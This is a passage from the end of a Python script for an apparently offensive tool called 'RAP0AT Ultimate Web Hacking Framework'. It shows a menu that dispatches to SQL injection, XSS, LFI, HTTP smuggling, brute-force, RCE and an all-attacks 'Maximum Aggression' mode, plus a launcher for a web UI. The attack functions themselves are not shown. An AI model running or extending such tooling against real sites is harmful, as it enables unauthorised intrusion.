        print(colored("6.", "red") + colored(" RCE & SSRF Attacks",      
"green"))                                                                
        print(colored("7.", "red") + colored(" Complete Web Scan",       
"red"))                                                                
        print(colored("8.", "red") + colored(" Maximum Aggression (All Attacks)", "red"))
        print(colored("9.", "red") + colored(" View Live Output",        
"green"))                                                                
        print(colored("0.", "red") + colored(" Exit", "yellow"))         
                                                                         
        print(colored("\n[+] Your command: ", "cyan"), end="")           
        choice = input().strip()
                                                                         
        if choice == '1':
            result = perform_sqli_attack()
            status = colored("SUCCESS", "green") if result['success'] else colored("FAILURE", "red")
            print(f"[+] SQL Injection: {status} - {result['message']}")  
                                                                         
        elif choice == '2':                                              
            result = perform_reflected_xss()
            status = colored("SUCCESS", "green") if result['success'] else colored("FAILURE", "red")
            print(f"[+] XSS Attack: {status} - {result['message']}")     
                                                                         
        elif choice == '3':                                              
            result = perform_lfi_attack()
            status = colored("SUCCESS", "green") if result['success'] else colored("FAILURE", "red")
            print(f"[+] LFI Attack: {status} - {result['message']}")     
                                                                         
        elif choice == '4':                                              
            result = perform_http_smuggling()
            status = colored("SUCCESS", "green") if result['success'] else colored("FAILURE", "red")
            print(f"[+] HTTP Smuggling: {status} - {result['message']}")
                                                                         
        elif choice == '5':                                              
            result = perform_brute_force()
            status = colored("SUCCESS", "green") if result['success'] else colored("FAILURE", "red")
            print(f"[+] Brute Force: {status} - {result['message']}")    
                                                                         
        elif choice == '6':                                              
            result = perform_rce_attack()
            status = colored("SUCCESS", "green") if result['success'] else colored("FAILURE", "red")
            print(f"[+] RCE Attack: {status} - {result['message']}")     
                                                                         
        elif choice == '7':
            with app.test_request_context():
                result = api_complete_web_scan().get_json()
            status = colored("SUCCESS", "green") if result['success'] else colored("FAILURE", "red")
            print(f"[+] Complete Web Scan: {status} - {result['message']}")
                                                                         
        elif choice == '8':
            with app.test_request_context():
                result = api_maximum_aggression().get_json()
            status = colored("SUCCESS", "green") if result['success'] else colored("FAILURE", "red")
            print(f"[+] Maximum Aggression: {status} - {result['message']}")
                                                                         
        elif choice == '9':                                              
            typing_text("[!] Live Output:", "cyan")                      
            for result in web_framework.all_results[-20:]:
                status = colored("SUCCESS", "green") if result["success"] else colored("FAILURE", "red")
                print(f"  {status}: {result['technique']} - {result['details']}")
                                                                         
        elif choice == '0':                                              
            typing_text("[+] RAP0AT v1.0: Ultimate Web Hacking Framework Complete!", "green")
            break                                                        
                                                                         
        else:
            print(colored("[-] Invalid option", "red"))                  
                                                                         
def main():
    # Display initial options                                            
    clear()
    banner()
                                                                         
    print(colored("\n[+] RAP0AT v1.0 - Ultimate Web Hacking Framework Options:", "cyan"))
    print(colored("1.", "yellow") + colored(" Run on Terminal (Complete Web Hacking)", "green"))
    print(colored("2.", "yellow") + colored(" Run on Web (0.0.0.0:8000, Ultimate UI)", "green"))
                                                                         
    # Automatically choose option 2 for non-interactive environments
    choice = '2'
    print(colored("\n[+] Your choice (1 or 2): ", "cyan"), end="")       
    print(choice) # Simulate user input for logging
                                                                         
    if choice == '1':                                                    
        run_terminal_interface()
    elif choice == '2':                                                  
        run_web_server()
    else:
        print(colored("[-] Invalid choice", "red"))                      
        sys.exit(1)
                                                                         
if __name__ == "__main__":                                               
    main()
